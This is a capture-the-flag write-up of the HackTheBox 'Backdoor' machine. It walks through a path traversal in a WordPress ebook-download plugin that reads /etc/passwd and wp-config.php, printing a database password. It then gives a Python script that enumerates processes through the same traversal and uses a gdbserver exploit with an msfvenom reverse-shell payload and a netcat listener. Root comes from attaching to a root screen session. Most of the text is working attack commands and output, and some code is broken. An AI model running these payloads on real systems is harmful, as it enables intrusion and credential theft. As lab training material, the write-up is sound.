---
title: Backdoor Machine HTB
date: 2023-02-1 00:18:00 +0700
categories: [TOP_CATEGORIE, SUB_CATEGORIE]
tags: [machines]
---

## Enumeration

```ruby
PORT STATE SERVICE VERSION
22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
| 3072 b4de43384657db4c213b69f3db3c6288 (RSA)
| 256 aac9fc210f3ef4ef4ec6b3570262253ef66 (ECDSA)
|_ 256 d28be4ec0761aacaf8ec1cf88cc1f6e1 (ED25519)
80/tcp open http Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Backdoor &#8211; Real-Life
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-generator: WordPress 5.8.1
1337/tcp open waste?
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Applying a fuzzing, we see a lot of WordPress related files. If we look at the wappalyzer, we see that it uses version 5.8.1

## User Exploit

Investigating the directories of the website, we find `/wp-content/plugins`, inside which we find several files, one of them called eBook Downaload, so let's look for an exploit:
```shell
searchsploit wordpress ebook download
```

And we find the following exploit:

```shell
/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=../../../../etc/passwd
```

Which abuses the path traversal to list files:

Once we run the command, we can now download and view /etc/passwd. 

Using the same command, we can view the wp-config.php, from which we can get the following information:
```mysql
define( 'DB_NAME', 'wordpress' );
/** MySQL database username */
define( 'DB_USER', 'wordpressuser' );
/** MySQL database password */
define( 'DB_PASSWORD', 'MQYBJSaD#DxG6qbm' );
/** MySQL hostname */
define( 'DB_HOST', 'localhost' );
/** Database charset to use in creating database tables. */
define( 'DB_CHARSET', 'utf8' );
/** The database collate type. Don't change this if in doubt. */
define( 'DB_COLLATE', '' );
```

However, we cannot use these credentials anywhere. 

We are going to try to exploit port 1337, but since this has no general use as such, let's create a python script to see what process is running on it:
```python
#!/usr/bin/python3

from pwn import *
import requests, signal, sys, pdb, time

def def_handler (sig, frame):
    print ("[!] You pressed Ctrl+C").
    sys.exit(1)

signal.signal(signal.SIGINT, def_handler)

main_url="http://10.129.220.82/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl="

def makeRequest():
    p1=log.progress("Brute Force status:")
    p1.status("Starting...")
    time.sleep(1)
    
    for i in range(1,1000):
    
        p1.status("Trying: "+str(i))
        
        url=main_url+"/proc/"+str(i)+"/cmdline"
        
        r=requests.get(url)
        
        if len(r.content)>82:
            print("------------------------------------------")
            log.info("Found PID: "+str(i)))
           # log.info("Total length: "+str(len(r.content))))
            log.info(r.content)
            print("------------------------------------------")
            
if __name__ == '__main__':
    makeRequest()
```

And we see some very interesting information:
```shell
[*] Found PID: 955
[*] /proc/955/cmdline/proc/955/cmdline/proc/955/cmdline/bin/sh\x00c\x00hile true;do su user -c "cd /home/user;gdbserver --once 0.0.0.0.0:1337 /bin/true;";
```

Moreover, it is running on port 1337, which is the one we are interested in. Therefore, we are dealing with a gdbserver, which has an exploit for its version 9.2

```shell
❯ python3 gbd.py

Usage: python3 gbd.py <gdbserver-ip:port> <path-to-shellcode>.

Example:
- Victim's gdbserver -> 10.10.10.10.200:1337
- Attacker's listener -> 10.10.10.10.100:4444

1. Generate shellcode with msfvenom:
$ msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.10.100 LPORT=4444 PrependFork=true -o rev.bin

2. Listen with Netcat:
$ nc -nlvp 4444

3. Run the exploit:
$ python3 gbd.py 10.10.10.200:1337 rev.bin
```

We listen on port 4444 and run the script:

```python
python3 gbd.py 10.129.220.82:1337 rev.bin
```

and we would enter the machine as `user`.

## Root Exploit

Doing a `ps uax` we see that the following is executed as root:
```shell
root 956 0.0 0.0 0.0 2608 1756 ? Ss 11:53 0:01 /bin/sh -c while true;do sleep 1;find /var/run/screen/S-root/ -empty -exec screen -dmS root;; done
```

If we look at the screen manual, we can see what the parameters used in the above process mean:

-S -> create a session with the specified name (In our case root).

-d -> to make a dettach

-m -> ask screen to ingest the environment variable $STY 

So, using the `-x` parameter we could already synchronize to the root screen: `screen -x root/` . Another possible option would be `screen -r root/` .

And we will be able to see the root flag.
